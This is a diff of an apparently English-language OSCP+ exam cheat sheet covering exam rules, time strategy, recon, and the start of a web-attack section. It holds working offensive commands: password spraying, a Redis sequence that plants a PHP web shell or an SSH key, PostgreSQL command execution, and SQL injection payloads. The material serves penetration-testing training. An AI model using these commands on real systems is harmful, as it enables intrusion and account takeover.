+<p><strong>Variables.</strong> Every command uses the variables below; there are no hard-coded IPs. For each new target, change only <code>IP</code>.</p>
+<pre><code class="language-bash"># ~/exam/vars.sh  →  in every tmux window:  source ~/exam/vars.sh
+export LHOST=$(ip -4 -o addr show tun0 | awk '{print $4}' | cut -d/ -f1)   # your VPN IP
+export LPORT=443
+export IP=192.168.x.x                 # the current target
+export DC=10.10.x.x DOMAIN=corp.local USER=user PASS='Passw0rd!'
+</code></pre>
+<p>There are no variables on the target side (in a Windows/Linux shell): in commands you paste there, replace <code>LHOST</code> with your own IP. Anything in angle brackets (<code>&lt;NTLM&gt;</code>, <code>&lt;PID&gt;</code>) is filled in by hand.</p>
+<hr />
+<h1 id="en-exam-rules">1. OSCP+ exam rules and scoring</h1>
+<div class="admonition danger">
+<p class="admonition-title">Rules change — read the official guide before the exam</p>
+<p>This section was checked on 31 October 2026 against the official <strong>OSCP+ Exam Guide</strong> (help.offsec.com, the version updated that same day), the <strong>OSCP+ Scoring Update</strong> blog post and the <strong>Equated Scaled Scoring FAQ</strong>. OffSec updates its rules often: re-read these pages one week before your exam. If this guide conflicts with the official guide, the official guide wins.</p>
 </div>
-<button id="menu" type="button">İçindekiler</button>
-<script>
-(function(){
-  var store={get:function(k){try{return localStorage.getItem(k)}catch(e){return null}},
-             set:function(k,v){try{localStorage.setItem(k,v)}catch(e){}}};
-  // copy buttons
-  document.querySelectorAll('main pre').forEach(function(pre){
-    var w=document.createElement('div');w.className='codewrap';pre.parentNode.insertBefore(w,pre);w.appendChild(pre);
-    var b=document.createElement('button');b.className='copy';b.type='button';b.textContent='Kopyala';
-    b.onclick=function(){var t=pre.innerText;
-      (navigator.clipboard?navigator.clipboard.writeText(t):Promise.reject()).catch(function(){
-        var ta=document.createElement('textarea');ta.value=t;document.body.appendChild(ta);ta.select();
-        try{document.execCommand('copy')}catch(e){} ta.remove();});
-      b.textContent='Kopyalandı';setTimeout(function(){b.textContent='Kopyala'},1200);};
-    w.appendChild(b);
-  });
-  // LHOST live replace
-  var phs=document.querySelectorAll('.ph'), inp=document.getElementById('lhost');
-  function applyHost(v){phs.forEach(function(s){s.textContent=v||'LHOST'});}
-  var saved=store.get('oscp-lhost'); if(saved){inp.value=saved;applyHost(saved);}
-  inp.addEventListener('input',function(){applyHost(inp.value.trim());store.set('oscp-lhost',inp.value.trim());});
-  // theme
-  var root=document.documentElement, th=store.get('oscp-theme'); if(th) root.setAttribute('data-theme',th);
-  document.getElementById('theme').onclick=function(){
-    var dark=root.getAttribute('data-theme')==='dark'||(!root.getAttribute('data-theme')&&matchMedia('(prefers-color-scheme: dark)').matches);
-    var n=dark?'light':'dark';root.setAttribute('data-theme',n);store.set('oscp-theme',n);};
-  // sections for search + scrollspy
-  var main=document.querySelector('main'), secs=[], cur=null;
-  Array.prototype.slice.call(main.children).forEach(function(el){
-    if(el.tagName==='H1'||el.tagName==='H2'){cur={h:el,els:[el]};secs.push(cur);}
-    else if(cur) cur.els.push(el);
-  });
-  document.getElementById('q').addEventListener('input',function(e){
-    var q=e.target.value.trim().toLocaleLowerCase('tr');
-    secs.forEach(function(s){
-      var hit=!q||s.els.some(function(el){return el.textContent.toLocaleLowerCase('tr').indexOf(q)>-1});
-      s.els.forEach(function(el){el.classList.toggle('hidden',!hit)});
+<div class="admonition warning">
+<p class="admonition-title">Scoring changes from 1 December 2026</p>
+<p>Exams <strong>starting on or after 1 December 2026 08:00 GMT</strong> use <em>equated scaled scoring</em>. According to OffSec you should no longer "use 70 points, or any other raw score, as a passing target"; the raw score alone does not decide whether you pass. The result is announced after grading. There is no published numeric pass mark (figures circulating online such as "400 out of 500" are not official). Exam content, machine layout, duration, proof and report rules <strong>do not change</strong>.
+Exams taken <strong>up to 30 November 2026</strong> keep the old rule: 70 out of 100. If you reschedule an exam booked before 1 December to a date after it, you are graded with the new method. In practice the goal is the same in both cases: <strong>as many machines as possible + a flawless report</strong>, and always submit the report even if you think your points are enough.</p>
+</div>
+<h2 id="en-exam-structure">1.1 Exam structure</h2>
+<table>
+<thead>
+<tr>
+<th>Item</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Duration</td>
+<td>23 hours 45 minutes (proctored)</td>
+</tr>
+<tr>
+<td>Report</td>
+<td>A further 24 hours after the exam ends</td>
+</tr>
+<tr>
+<td>Standalone machines</td>
+<td>3 × 20 points (10 local.txt + 10 proof.txt)</td>
+</tr>
+<tr>
+<td>AD set</td>
+<td>3 machines = 40 raw points (machine #1: 10, #2: 10, #3: 20)</td>
+</tr>
+<tr>
+<td>AD starting point</td>
+<td><strong>Assumed breach:</strong> you are given a username + password</td>
+</tr>
+<tr>
+<td>Total / pass</td>
+<td>100 raw points. <strong>Up to 30 November 2026:</strong> pass with 70. <strong>From 1 December 2026:</strong> scaled scoring, no fixed raw pass mark (see the warning above)</td>
+</tr>
+<tr>
+<td>Bonus points</td>
+<td><strong>None.</strong> Removed on 1 November 2024.</td>
+</tr>
+<tr>
+<td>Reverts</td>
+<td>Up to 24 from the control panel; the counter can be reset once during the exam</td>
+</tr>
+<tr>
+<td>Partial points</td>
+<td>Explicitly stated in the guide for standalone machines (low-privilege and full privilege). For AD the guide only lists points per machine; it does not mention partial points separately</td>
+</tr>
+</tbody>
+</table>
+<h2 id="en-points-math">1.2 The 70-point math (exams up to 30 November 2026)</h2>
+<p>This table uses the old 70/100 rule. From 1 December 2026 there is no fixed threshold, but the table still shows which combinations are "strong".</p>
+<p>Passing combinations (no bonus):</p>
+<table>
+<thead>
+<tr>
+<th>Profile</th>
+<th>Calculation</th>
+<th>Total</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Full AD + 1.5 standalone</td>
+<td>40 + 20 + 10</td>
+<td><strong>70</strong> ✅</td>
+</tr>
+<tr>
+<td>Full AD + 2 standalone</td>
+<td>40 + 20 + 20</td>
+<td><strong>80</strong> ✅</td>
+</tr>
+<tr>
+<td>3 full standalone + 1 AD machine</td>
+<td>60 + 10</td>
+<td><strong>70</strong> ✅</td>
+</tr>
+<tr>
+<td>3 full standalone + 2 AD machines</td>
+<td>60 + 20</td>
+<td><strong>80</strong> ✅</td>
+</tr>
+<tr>
+<td>Full AD only</td>
+<td>40</td>
+<td>❌</td>
+</tr>
+<tr>
+<td>3 full standalone only</td>
+<td>60</td>
+<td>❌</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Takeaway:</strong> you cannot pass with a single area. The safest route is to finish the AD set and add at least 30 points from standalone machines. On standalone machines <strong>initial access (local.txt)</strong> is usually easier than privesc: local.txt on all three machines is 30 points.</p>
+<h2 id="en-restrictions">1.3 Restrictions (things that can zero your score)</h2>
+<table>
+<thead>
+<tr>
+<th>Rule</th>
+<th>What it means in practice</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Metasploit on one machine only</strong></td>
+<td><code>exploit</code>/<code>auxiliary</code>/<code>post</code> modules and <strong>Meterpreter</strong> only on the single target you choose. <strong>The <code>check</code> command also counts as use</strong> (you cannot try it everywhere first and then choose). The moment you start, you are locked to that target; even if the attack fails you cannot use it on another target. <strong>You cannot pivot with Metasploit</strong> (it counts as use on more than one target).</td>
+</tr>
+<tr>
+<td>msfvenom and <code>multi/handler</code></td>
+<td>Allowed on every machine. Meterpreter payloads, however, fall under the single-target rule above.</td>
+</tr>
+<tr>
+<td><strong>Automatic exploitation tools are banned</strong></td>
+<td><code>sqlmap</code>, sqlninja, db_autopwn, browser_autopwn and so on. Know how to do SQLi <strong>manually</strong>.</td>
+</tr>
+<tr>
+<td>Mass vulnerability scanners are banned</td>
+<td>Nessus, NeXpose, OpenVAS, Canvas, Core Impact, SAINT and so on. Allowed examples: Nmap (including NSE), Nikto, Burp Free, DirBuster</td>
+</tr>
+<tr>
+<td>Other tools with banned functionality</td>
+<td>A feature of another tool that uses banned/restricted functionality is also banned (for example an automatic exploitation module inside a tool)</td>
+</tr>
+<tr>
+<td><strong>Spoofing is banned</strong></td>
+<td>ARP / DNS / NBNS / LLMNR poisoning. <strong>Do not poison with Responder.</strong></td>
+</tr>
+<tr>
+<td>Commercial tools are banned</td>
+<td>Burp Suite <strong>Pro</strong>, Cobalt Strike, Metasploit Pro and so on. Burp Community is allowed.</td>
+</tr>
+<tr>
+<td><strong>AI / LLMs are banned</strong></td>
+<td>OffSec KAI, ChatGPT, Deepseek, Gemini, Claude and so on are "strictly prohibited" — <strong>including while writing the report</strong>. You do not have to switch off built-in AI features in tools such as Notion or Google AI Overview (details: "AI Usage Policy in OffSec Exams").</td>
+</tr>
+<tr>
+<td>Communication</td>
+<td>Talking to anyone else or posting on forums/Discord is banned.</td>
+</tr>
+</tbody>
+</table>
+<p>Techniques that conflict with this table (sqlmap, Responder, Meterpreter on more than one machine) either do not appear in this guide or are labelled <strong>"banned/restricted in the exam"</strong>.</p>
+<h2 id="en-scoring-conditions">1.4 When points are awarded</h2>
+<ul>
+<li><strong>local.txt / proof.txt must be read in an interactive shell on the target</strong>, with <code>cat</code> / <code>type</code>, <strong>from the file's own location</strong>. Proof obtained any other way means <strong>zero points</strong> for that target — the guide explicitly includes <strong>"any form of web-based shell"</strong> (reading the file through LFI/SQLi does not count either).</li>
+<li>Shell privilege for proof.txt: <strong>root</strong> on Linux, <strong>SYSTEM / Administrator / a user with administrative rights</strong> on Windows. proof.txt is in <code>/root/</code> or on the Administrator's desktop; local.txt can be read with an unprivileged account.</li>
+<li>The screenshot must show the flag contents + the target's <strong>IP address</strong> (<code>ipconfig</code> / <code>ifconfig</code> / <code>ip addr</code>). No screenshot means <strong>zero points</strong> for that target. (Adding <code>whoami</code>/<code>id</code> and the hostname makes the proof stronger.)</li>
+<li><strong>Submit the flag in the Exam Control Panel before the exam ends.</strong> The panel <strong>does not tell you</strong> whether the value you entered is correct — watch out for copy-paste errors.</li>
+<li>The full-points objectives for every machine are listed in the control panel; read them at the start of the exam.</li>
+<li>The steps in the report must be detailed enough for a technical reader to reproduce them step by step. The guide: "documentation requirements are very strict"; insufficient documentation reduces your points or zeroes them.</li>
+</ul>
+<p>All the proof in a single frame:</p>
+<pre><code class="language-bash"># Linux
+hostname; id; ip a | grep inet; cat /root/proof.txt
+</code></pre>
+<pre><code class="language-powershell"># Windows (cmd)
+hostname &amp; whoami &amp; ipconfig | findstr IPv4 &amp; type C:\Users\Administrator\Desktop\proof.txt
+</code></pre>
+<h2 id="en-point-loss">1.5 Common ways to lose points</h2>
+<ul>
+<li>Reading the flag from a web shell (not an interactive shell).</li>
+<li>No IP/hostname in the screenshot.</li>
+<li>Forgetting to submit the flag in the panel, or mixing up the flags of two machines (note every flag together with its hostname).</li>
+<li>Using Metasploit/Meterpreter on a second machine without noticing.</li>
+<li>Modifying an exploit without documenting the change in the report (which line, and why).</li>
+<li>Assuming the control panel "validates" the flag (it does not).</li>
+<li>Not submitting the report because you think your points are enough (OffSec: submit the report whatever your score).</li>
+</ul>
+<hr />
+<h1 id="en-strategy">2. Strategy, time and note discipline</h1>
+<h2 id="en-time-plan">2.1 Time plan (09:00 start example)</h2>
+<table>
+<thead>
+<tr>
+<th>Time</th>
+<th>Task</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>08:15–09:00</td>
+<td>Proctor checks, VPN, <code>vars.sh</code>, tmux, note templates</td>
+</tr>
+<tr>
+<td>09:00–13:00</td>
+<td><strong>AD set</strong> (enum with the given user → machine 1 → machine 2 → DC)</td>
+</tr>
+<tr>
+<td>13:00–13:45</td>
+<td>Break: food, away from the screen</td>
+</tr>
+<tr>
+<td>13:45–17:45</td>
+<td>Standalone machines A and B — <strong>at most 2 hours</strong> each, then park it</td>
+</tr>
+<tr>
+<td>17:45–18:30</td>
+<td>Break</td>
+</tr>
+<tr>
+<td>18:30–21:30</td>
+<td>Standalone machine C + a second round on the parked ones</td>
+</tr>
+<tr>
+<td>21:30–22:00</td>
+<td>Points check: which flags are in the panel? Are the screenshots complete?</td>
+</tr>
+<tr>
+<td>22:00–03:00</td>
+<td>Missing privescs / whatever you are stuck on</td>
+</tr>
+<tr>
+<td><strong>03:00–07:00</strong></td>
+<td><strong>Sleep</strong> (set an alarm; tell the proctor you are taking a break)</td>
+</tr>
+<tr>
+<td>07:00–08:45</td>
+<td>Last attempts with a fresh head + missing screenshots + tidy up your notes</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>You get a separate 24 hours for the report; spend the last hours of the exam <strong>collecting proof</strong>, not <strong>writing</strong> the report. Access to the machines ends with the exam — a missing screenshot cannot be taken afterwards.</li>
+<li>Once you have a serious number of points (70 under the old rule): stop, double-check all proof and panel entries, then carry on. After 1 December 2026 there is no fixed threshold, so do not stop at "that's enough"; keep going while you have time.</li>
+<li>Tell the proctor about every break in the chat.</li>
+</ul>
+<h2 id="en-setup">2.2 Environment setup (once)</h2>
+<pre><code class="language-bash">mkdir -p ~/exam/{recon,exploits,loot,notes,screens,tools}
+cd ~/exam &amp;&amp; tmux new -s exam
+# Window layout:  0: http.server   1: listener   2: commands   3: notes
+# Ctrl+b c  new window   Ctrl+b n/p  switch   Ctrl+b %  vertical split
+script -a ~/exam/notes/session-$(date +%F).log      # full terminal log
+</code></pre>
+<p>Download in advance and keep ready under <code>~/exam/tools/</code> (do not waste exam time going to GitHub):</p>
+<table>
+<thead>
+<tr>
+<th>Linux</th>
+<th>Windows</th>
+<th>AD / pivot</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>linpeas.sh, pspy64, lse.sh</td>
+<td>winPEASx64.exe, winPEAS.bat, PowerUp.ps1, SharpUp.exe</td>
+<td>SharpHound.exe/.ps1, PowerView.ps1, Rubeus.exe</td>
+</tr>
+<tr>
+<td>linux-exploit-suggester.sh</td>
+<td>PrintSpoofer64.exe, GodPotato-NET4.exe, JuicyPotatoNG.exe</td>
+<td>mimikatz.exe (x64), RunasCs.exe</td>
+</tr>
+<tr>
+<td>socat (static), nc (static)</td>
+<td>nc64.exe, accesschk64.exe, Seatbelt.exe</td>
+<td>chisel (linux+windows), ligolo-ng proxy + agent (linux+windows)</td>
+</tr>
+</tbody>
+</table>
+<h2 id="en-note-template">2.3 Note template (copy for every target)</h2>
+<pre><code class="language-markdown"># &lt;IP&gt; — &lt;hostname&gt; — &lt;OS&gt;
+## Ports / services
+## Credentials found
+| user | password / hash | source | where tried | result |
+## Paths tried
+- [x] /admin login — default creds DID NOT WORK
+- [ ] SMB share &quot;backup&quot; — not downloaded
+## Initial access   (commands + modified exploit lines)
+## Privesc          (commands)
+## Flags            local: ____ (in panel ✔)   proof: ____ (in panel ✔)
+## Screenshots      01-&lt;host&gt;-local.png ...
+</code></pre>
+<p>The report is a cleaned-up version of these notes. Paste <strong>every command that produced a result</strong> here (and every line you changed in an exploit).</p>
+<h2 id="en-thirty-minutes">2.4 The 30-minute rule (when you are stuck)</h2>
+<p>If you have had no <strong>new information</strong> (port, directory, user, error message, credential) for 30 minutes:</p>
+<ol>
+<li>Stop. Step away from the screen for 2 minutes.</li>
+<li>Did the <strong>full TCP</strong> scan finish? Did you really read the <code>-p-</code> results? Did you check UDP (161!)?</li>
+<li>Write down the <strong>exact version</strong> of every service and search each one in <code>searchsploit</code> + Google.</li>
+<li>Web: source code, JS files, comments, <code>/.git/</code>, backup files, vhosts, other extensions (<code>-x php,txt,bak,zip</code>).</li>
+<li>Did you try <strong>every credential on every service</strong>? (see 2.5) Did you try the username as the password?</li>
+<li>Go back to whatever you called "empty" earlier (a file on anonymous FTP, a share on SMB).</li>
+<li>Still nothing: <strong>park it</strong> and move to another machine. Do not fall into the sunk-cost trap.</li>
+</ol>
+<h2 id="en-credential-reuse">2.5 Credential reuse matrix</h2>
+<p>The <strong>moment</strong> you find a new password/hash:</p>
+<table>
+<thead>
+<tr>
+<th>Found</th>
+<th>Try immediately</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Any password</td>
+<td>SSH, SMB, WinRM, RDP, MSSQL, web login, <code>su</code> with every known user</td>
+</tr>
+<tr>
+<td>Web / CMS admin</td>
+<td>SSH and the DB with the same password; RCE features in the admin panel</td>
+</tr>
+<tr>
+<td>DB password (config file)</td>
+<td>The user table in the DB (hashes), SSH / <code>su</code> with the same password</td>
+</tr>
+<tr>
+<td><code>id_rsa</code></td>
+<td><code>chmod 600</code>; try it with every user; <code>ssh2john</code> if it has a passphrase</td>
+</tr>
+<tr>
+<td>NTLM hash</td>
+<td><strong>Pass-the-Hash</strong> before cracking: <code>nxc smb/winrm</code>, <code>evil-winrm -H</code>, <code>impacket-*exec -hashes</code></td>
+</tr>
+<tr>
+<td>Local Administrator hash</td>
+<td><code>nxc smb &lt;subnet&gt; -u administrator -H &lt;NTLM&gt; --local-auth</code> (local admin password reuse)</td>
+</tr>
+<tr>
+<td>Kerberoast / AS-REP hash</td>
+<td><code>hashcat -m 13100</code> / <code>-m 18200</code> → password → try it everywhere</td>
+</tr>
+<tr>
+<td><code>.kdbx</code> (KeePass)</td>
+<td><code>keepass2john</code> → crack → every password inside</td>
+</tr>
+<tr>
+<td>Domain user list</td>
+<td><strong>Spray</strong> the passwords you found against this list (mind the lockout policy)</td>
+</tr>
+</tbody>
+</table>
+<pre><code class="language-bash"># Bulk attempts in one command (users and passwords in files)
+nxc smb $IP   -u users.txt -p passwords.txt --continue-on-success
+nxc winrm $IP -u users.txt -p passwords.txt --continue-on-success
+nxc ssh $IP   -u users.txt -p passwords.txt --continue-on-success
+nxc rdp $IP   -u users.txt -p passwords.txt --continue-on-success
+nxc mssql $IP -u users.txt -p passwords.txt --continue-on-success
+</code></pre>
+<div class="admonition tip">
+<p class="admonition-title">What does <code>(Pwn3d!)</code> mean?</p>
+<p>If you see <code>(Pwn3d!)</code> in nxc output, that user is a <strong>local admin</strong> on that machine (SMB) or can run commands (WinRM). Go straight in with <code>impacket-psexec</code> / <code>evil-winrm</code>.</p>
+</div>
+<hr />
+<h1 id="en-recon">3. Recon and service enumeration</h1>
+<h2 id="en-nmap">3.1 Nmap — one workflow</h2>
+<pre><code class="language-bash">cd ~/exam/recon
+# 1) All TCP ports (start in the background, look at the web while you wait)
+sudo nmap -p- --min-rate 5000 -Pn -oN $IP-all.txt $IP
+# 2) Versions + default scripts on the open ports
+PORTS=$(grep -oP '^\d+(?=/tcp\s+open)' $IP-all.txt | paste -sd,)
+sudo nmap -sC -sV -p$PORTS -Pn -oA $IP-svc $IP
+# 3) UDP (always, for SNMP, TFTP, DNS)
+sudo nmap -sU --top-ports 50 -Pn --open -oN $IP-udp.txt $IP
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>Situation</th>
+<th>What to do</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>--min-rate 5000</code> seems to miss ports</td>
+<td>Repeat with <code>-T4 --max-retries 2</code>, or <code>rustscan -a $IP -- -sC -sV</code></td>
+</tr>
+<tr>
+<td>Every port <code>filtered</code></td>
+<td>Is <code>-Pn</code> set? Slower: <code>-T3</code>; ICMP may be blocked</td>
+</tr>
+<tr>
+<td>Odd service</td>
+<td><code>nmap -sV --version-all -p&lt;port&gt;</code>, banner with <code>nc -nv $IP &lt;port&gt;</code></td>
+</tr>
+<tr>
+<td>Only a few ports</td>
+<td>The attack surface is small: dig into those services <strong>very deeply</strong></td>
+</tr>
+</tbody>
+</table>
+<p>Useful NSE: <code>--script vuln</code> (general), <code>smb-vuln-ms17-010</code>, <code>http-enum</code>, <code>ftp-anon</code>, <code>nfs-showmount</code>, <code>snmp-*</code>.</p>
+<h2 id="en-port-first">3.2 Port → first things to do</h2>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+<th>First check</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>21</td>
+<td>FTP</td>
+<td>anonymous, write access (if it is the web root → shell), version CVEs</td>
+</tr>
+<tr>
+<td>22</td>
+<td>SSH</td>
+<td>keys/passwords you found; rarely a CVE</td>
+</tr>
+<tr>
+<td>25/587</td>
+<td>SMTP</td>
+<td><code>VRFY</code>/<code>RCPT</code> user enum; sending e-mail for client-side attacks</td>
+</tr>
+<tr>
+<td>53</td>
+<td>DNS</td>
+<td>zone transfer (AXFR), subdomains</td>
+</tr>
+<tr>
+<td>80/443/8080…</td>
+<td>HTTP</td>
+<td>Section 4</td>
+</tr>
+<tr>
+<td>88</td>
+<td>Kerberos</td>
+<td><strong>Sign of a DC</strong>; <code>kerbrute userenum</code>, AS-REP</td>
+</tr>
+<tr>
+<td>111/2049</td>
+<td>NFS</td>
+<td><code>showmount -e</code>, <code>no_root_squash</code></td>
+</tr>
+<tr>
+<td>135/139/445</td>
+<td>RPC/SMB</td>
+<td>null/guest session, shares, RID brute, signing</td>
+</tr>
+<tr>
+<td>161/udp</td>
+<td>SNMP</td>
+<td><code>public</code> community, users, passwords in process arguments</td>
+</tr>
+<tr>
+<td>389/636/3268</td>
+<td>LDAP</td>
+<td>anonymous bind, passwords in user descriptions</td>
+</tr>
+<tr>
+<td>1433</td>
+<td>MSSQL</td>
+<td><code>sa</code> / domain auth, <code>xp_cmdshell</code>, <code>xp_dirtree</code></td>
+</tr>
+<tr>
+<td>3306</td>
+<td>MySQL</td>
+<td>root with an empty password, <code>INTO OUTFILE</code>, UDF</td>
+</tr>
+<tr>
+<td>3389</td>
+<td>RDP</td>
+<td>log in with credentials you found (GUI → easier privesc enum)</td>
+</tr>
+<tr>
+<td>5432</td>
+<td>PostgreSQL</td>
+<td><code>postgres:postgres</code>, <code>COPY ... FROM PROGRAM</code> → RCE</td>
+</tr>
+<tr>
+<td>5985/5986</td>
+<td>WinRM</td>
+<td><code>evil-winrm</code> (password or hash)</td>
+</tr>
+<tr>
+<td>6379</td>
+<td>Redis</td>
+<td>no auth → write to the web root / SSH key / cron</td>
+</tr>
+<tr>
+<td>27017</td>
+<td>MongoDB</td>
+<td>is there no auth?</td>
+</tr>
+</tbody>
+</table>
+<h2 id="en-ftp">3.3 FTP (21)</h2>
+<pre><code class="language-bash">ftp anonymous@$IP                 # password: empty or anonymous
+# ftp&gt;  passive / binary / ls -la / get file / put test.txt
+wget -m --no-passive ftp://anonymous:anonymous@$IP     # download everything
+nmap -p21 --script ftp-anon,ftp-syst $IP
+</code></pre>
+<h2 id="en-smb">3.4 SMB / RPC (139, 445)</h2>
+<pre><code class="language-bash"># Null and guest sessions
+nxc smb $IP -u '' -p '' --shares
+nxc smb $IP -u 'guest' -p '' --shares
+smbclient -N -L //$IP
+smbmap -H $IP -u guest
+
+# User list: RID brute (very valuable if guest/null works)
+nxc smb $IP -u guest -p '' --rid-brute 4000 | grep SidTypeUser
+impacket-lookupsid guest@$IP -no-pass
+
+# General enum
+enum4linux-ng -A $IP
+rpcclient -U '' -N $IP        # &gt; enumdomusers  &gt; querydispinfo (passwords in descriptions!)
+
+# Download a whole share
+smbclient //$IP/share -N -c 'prompt OFF; recurse ON; mget *'
+# or, with credentials, hunt files across every readable share
+nxc smb $IP -u $USER -p $PASS -M spider_plus -o DOWNLOAD_FLAG=True
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>Finding</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>READ share</td>
+<td>Look for configs, scripts, backups, <code>.kdbx</code>, <code>.xml</code> (GPP)</td>
+</tr>
+<tr>
+<td>WRITE share</td>
+<td>If it is a web root → shell; if users browse the share → capture NetNTLMv2 with a <code>.lnk</code>/<code>.url</code> (only with your own <code>impacket-smbserver</code>, not spoofing)</td>
+</tr>
+<tr>
+<td><code>signing:False</code></td>
+<td>Relay is possible (advanced technique outside the exam, see 10.10)</td>
+</tr>
+</tbody>
+</table>
+<h2 id="en-snmp">3.5 SNMP (161/udp)</h2>
+<pre><code class="language-bash">onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt $IP
+snmpwalk -v2c -c public $IP | tee snmp.txt
+snmpbulkwalk -v2c -c public $IP NET-SNMP-EXTEND-MIB::nsExtendObjects   # custom script output (passwords!)
+snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.4.2.1.5    # process arguments
+snmpwalk -v2c -c public $IP 1.3.6.1.4.1.77.1.2.25     # Windows users
+snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.6.3.1.2    # installed software
+</code></pre>
+<h2 id="en-ldap">3.6 LDAP / Kerberos (389, 88)</h2>
+<pre><code class="language-bash">ldapsearch -x -H ldap://$IP -s base namingcontexts
+ldapsearch -x -H ldap://$IP -b &quot;DC=corp,DC=local&quot; &quot;(objectClass=user)&quot; sAMAccountName description
+# With credentials
+nxc ldap $IP -u $USER -p $PASS --users            # read the description fields
+# Username validation (no credentials needed)
+kerbrute userenum -d $DOMAIN --dc $IP /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+</code></pre>
+<h2 id="en-misc-services">3.7 NFS, SMTP, DNS, databases, Redis</h2>
+<pre><code class="language-bash"># NFS
+showmount -e $IP
+sudo mount -t nfs -o vers=3,nolock $IP:/export /mnt/nfs     # then ls -lan
+# SMTP user enum
+smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t $IP
+# DNS
+dig axfr @$IP $DOMAIN
+# MySQL
+mysql -h $IP -u root -p --skip-ssl
+# MSSQL
+impacket-mssqlclient $USER:$PASS@$IP -windows-auth       # domain account
+impacket-mssqlclient sa:$PASS@$IP                        # SQL account
+# PostgreSQL → RCE (if superuser)
+psql -h $IP -U postgres
+#   CREATE TABLE c(o text); COPY c FROM PROGRAM 'id'; SELECT * FROM c;
+# Redis
+redis-cli -h $IP info
+</code></pre>
+<p><strong>Redis (no auth) → web shell or SSH key:</strong></p>
+<pre><code class="language-bash">redis-cli -h $IP config set dir /var/www/html
+redis-cli -h $IP config set dbfilename shell.php
+redis-cli -h $IP set x '&lt;?php system($_GET[&quot;c&quot;]); ?&gt;'
+redis-cli -h $IP save
+# SSH key (if the redis user's home or /root/.ssh is writable)
+(echo -e &quot;\n\n&quot;; cat ~/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt
+cat key.txt | redis-cli -h $IP -x set k
+redis-cli -h $IP config set dir /var/lib/redis/.ssh
+redis-cli -h $IP config set dbfilename authorized_keys
+redis-cli -h $IP save
+</code></pre>
+<hr />
+<h1 id="en-web">4. Web applications</h1>
+<h2 id="en-web-priority">4.1 Web priority order</h2>
+<ol>
+<li><strong>Browse the site like a user</strong> (Burp Community open, proxy history recording). Source code, comments, JS files.</li>
+<li>Technology: <code>whatweb -a 3 http://$IP</code>, response headers, cookie names, the error page. <strong>If you find a version number, look for an exploit straight away.</strong></li>
+<li><code>/robots.txt</code>, <code>/sitemap.xml</code>, <code>/.git/HEAD</code>, <code>/.env</code>, <code>/backup</code>, <code>/admin</code>.</li>
+<li>Directory/file discovery (with extensions) and vhost discovery.</li>
+<li>If there is a login: default credentials → user enum → SQLi → weak password brute force.</li>
+<li>Every parameter: SQLi, LFI/traversal, command injection, SSTI.</li>
+<li>If there is a file upload: extension/content bypass.</li>
+</ol>
+<h2 id="en-content-discovery">4.2 Content and vhost discovery</h2>
+<pre><code class="language-bash">W=/usr/share/seclists/Discovery/Web-Content
+feroxbuster -u http://$IP -w $W/raft-medium-directories.txt -x php,txt,html,bak,zip -t 50 -o ferox.txt
+ffuf -u http://$IP/FUZZ -w $W/raft-medium-files.txt -ac                   # files
+gobuster dir -u http://$IP -w $W/directory-list-2.3-medium.txt -x php,txt -t 40 -b 404,403
+
+# vhosts (add to /etc/hosts first: echo &quot;$IP site.htb&quot; | sudo tee -a /etc/hosts)
+ffuf -u http://$IP -H &quot;Host: FUZZ.$DOMAIN&quot; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac
+
+# Parameter discovery
+ffuf -u &quot;http://$IP/page.php?FUZZ=test&quot; -w $W/burp-parameter-names.txt -ac
+</code></pre>
+<p><code>-ac</code> (auto-calibration) filters out false positives; if that is not enough, filter manually with <code>-fs &lt;size&gt;</code>, <code>-fc 404</code>, <code>-fw &lt;words&gt;</code>.</p>
+<p><strong>If you find an exposed <code>.git</code>:</strong></p>
+<pre><code class="language-bash">git-dumper http://$IP/.git ./repo &amp;&amp; cd repo
+git log -p | grep -iE 'pass|secret|key|token' ; git show &lt;commit&gt;
+</code></pre>
+<h2 id="en-default-creds">4.3 Default credentials</h2>
+<table>
+<thead>
+<tr>
+<th>Application</th>
+<th>Try</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Tomcat Manager</td>
+<td><code>tomcat:s3cret</code>, <code>tomcat:tomcat</code>, <code>admin:admin</code></td>
+</tr>
+<tr>
+<td>Jenkins</td>
+<td><code>admin:admin</code>, is sign-up open?</td>
+</tr>
+<tr>
+<td>phpMyAdmin / MySQL</td>
+<td><code>root:</code> (empty), <code>root:root</code></td>
+</tr>
+<tr>
+<td>Grafana / Zabbix / GLPI</td>
+<td><code>admin:admin</code>, <code>Admin:zabbix</code>, <code>glpi:glpi</code></td>
+</tr>
+<tr>
+<td>MSSQL</td>
+<td><code>sa:</code> (empty), <code>sa:sa</code></td>
+</tr>
+<tr>
+<td>General</td>
+<td><code>admin:admin</code>, <code>admin:password</code>, <strong>username = password</strong>, product name = password</td>
+</tr>
+</tbody>
+</table>
+<p>Unknown product: search for <code>"&lt;product name&gt; default password"</code>.</p>
+<h2 id="en-sqli">4.4 SQL injection (manual — sqlmap is banned in the exam)</h2>
+<p><strong>Detection:</strong></p>
+<pre><code class="language-sql">'
+' OR 1=1-- -
+' AND 1=1-- -     ↔     ' AND 1=2-- -     -- does the page change? (boolean)
+' AND SLEEP(5)-- -                         -- MySQL time-based
+'; WAITFOR DELAY '0:0:5'-- -               -- MSSQL
+'; SELECT pg_sleep(5)-- -                  -- PostgreSQL
